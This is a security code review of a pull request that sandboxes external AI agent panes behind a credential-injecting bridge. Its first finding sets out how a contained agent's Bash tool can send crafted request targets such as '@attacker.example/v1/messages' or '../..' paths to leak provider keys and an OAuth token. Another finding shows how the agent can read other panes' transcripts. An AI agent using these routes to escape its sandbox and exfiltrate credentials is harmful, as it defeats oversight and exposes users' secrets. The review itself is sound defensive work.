**Verdict: request changes.** Finding 1 lets the contained process both get around its network limit and steal a provider key. That undoes the main promise of #218.

I read the code only. I didn't build, run tests or modify anything.

**Findings**

1. **High: the bridge can be made to send the real key to any host.**
   - **Where:** `tui/src/claude_panes/bridge.rs:470-477` and `:725-736`.
   - **Problem:** The bridge builds the upstream URL by gluing the base URL to the request target, and it only checks that the request line *contains* `/v1/messages`. Origin-form targets (`/v1/messages`) are never checked for a leading `/`.
   - **Attack:** Any Bash tool inside the pane can read the bridge token from `ANTHROPIC_AUTH_TOKEN` and send a raw request to the allowed loopback port (`curl --request-target` or `nc`). For example, `POST @attacker.example/v1/messages HTTP/1.1` becomes `https://inference.baseten.co@attacker.example/v1/messages`. A target of `.attacker.example/v1/messages` becomes the host `inference.baseten.co.attacker.example`.
   - **Who's exposed:** The bridge runs outside the sandbox and attaches `Authorization: Bearer <key>` (plus `x-api-key` for the new kind). That leaks:
     - the Baseten key (new in this PR, since direct providers are now bridged);
     - the Vercel key;
     - the **Claude Plan OAuth token** (base URL `api.anthropic.com`).
   - **Same host:** `/v1/messages/../../x` also gets past the substring check, so any path on the provider's host can be called with the key.
   - **Fix:**
     - Make `request_target_from_request_line` return `None` unless the origin-form target starts with `/`.
     - Allow only `/v1/messages` and `/v1/messages/count_tokens`, optionally with a query, and refuse `..`, `@`, `#` and `\`.
     - Build the URL with `Url::parse(base)`, then the path and query, and require that scheme, host and port still match the base.
     - Return 400 or 404 otherwise.
     - Add tests for `@host`, `.host`, `:port`, `..` and an absolute-form target with userinfo.

2. **Medium: other panes' transcripts are readable from inside the sandbox.**
   - **Where:** `command_plan.rs:88` and `registry.rs:324`.
   - **Problem:** Pane artifacts live in `CODEX_HOME/panes/<id>/`. The contract makes `CODEX_HOME` read-only but doesn't deny reading `panes/`. A contained pane can therefore read every other pane's transcripts and audit files, including ones from earlier uncontained runs.
   - **Inconsistency:** The contract already denies `sessions` and `history.jsonl` for exactly this reason.
   - **Fix:** Write `settings.json` into the pane's state folder (or a read-only file there), and add a read denial on `CODEX_HOME/panes` for contained launches, or add `panes` to `PROTECTED_CODEX_HOME_ENTRIES`. Add a probe for it to the demo spec.

3. **Low/Medium: the provider key is fetched before the launch is checked.**
   - **Where:** `execution.rs:82-133` runs before `contain()` at `:150`.
   - **Problem:** The vault reveal (and the Claude Plan helper's token fetch) happens before the launch is checked. A refused launch has already decrypted the key and may have shown a vault or Keychain prompt. The code comment is about the bridge only, but the stated rule is that a refused launch never touches credentials.
   - **Fix:** Run `contain()` first, right after `external_agent_block_reason()`. Only the bridge port is needed, and the plan already has it. Then resolve credentials and start the bridge.

4. **Low: a non-UTF-8 environment variable crashes the turn.**
   - **Where:** `containment.rs:196`.
   - **Problem:** `std::env::vars()` panics on any non-UTF-8 variable, which would bring down the turn's task.
   - **Fix:** Use `vars_os()` and drop entries that aren't UTF-8.

5. **Low: turning the feature on mid-session doesn't contain panes.**
   - **Where:** `containment.rs:50`, `security/launch.rs:129`.
   - **Problem:** Settings are stored once at startup in a `OnceLock`. If `contained_external_agents` is switched on later (or startup never calls `install`), panes keep running uncontained with no message.
   - **Fix:** Read the feature from current config each turn, or document that a restart is required and show it in the UI.

6. **Info: the feature-off path is not byte-for-byte unchanged.**
   - **Where:** `bridge.rs:725`.
   - **Change:** Absolute-form target stripping now also applies to uncontained Vercel and Claude Plan bridges. The effect is harmless (it only fixes targets that were broken before). Once finding 1 is fixed, those bridges get the stricter checks too, which is intended.
   - **Unchanged:** The rest of the off path (`command_plan.rs` arms, `execution.rs` `None` branch) is the same apart from statement order.
   - **Profiles:** Claude Plan, Ambient and Vercel keep their existing bridge kinds.

7. **Test gaps.**
   - Nothing tests the URL the bridge builds against hostile targets (finding 1). The new absolute-form test covers only the normal case.
   - Nothing tests `contain()` once the contract is armed, i.e. that the transformed command:
     - allows only `localhost:<bridge_port>` (Seatbelt);
     - puts only the pane folder and state folder among the writable roots;
     - routes through `codex-linux-sandbox` with `arg0` set on Linux;
     - fails when `linux_sandbox_exe` is `None`.

     The core `LaunchContract` fixture could drive this without the process-wide `OnceLock`.
   - Nothing checks that a contained child gets only the allowlisted environment. One option is an `env_clear` assertion against a stub executable.
   - The demo probes leave out Keychain, `~/.claude/.credentials.json`, `CODEX_HOME/panes`, and a direct-to-bridge raw request with a hostile target.

**Checked and found sound**
- Clean environment: `env_clear`, the contract's allowlist, `*PROXY*` removed, then only the pane's own variables.
- No `apiKeyHelper` or provider key reaches Claude Code; the bridge token is per turn and random.
- Protected reads include `~/Library/Keychains` and `.claude/.credentials.json`.
- The state folder is outside `CODEX_HOME`, and the contract refuses the launch if it isn't.
- Seatbelt allows only the bridge's loopback port, with no local binding and no DNS.
- Absolute-form stripping by itself doesn't turn the bridge into an open proxy.
- Fail-closed cases work: contract not armed, no platform sandbox, a sandbox transform error, or no bridge each end the turn with an error.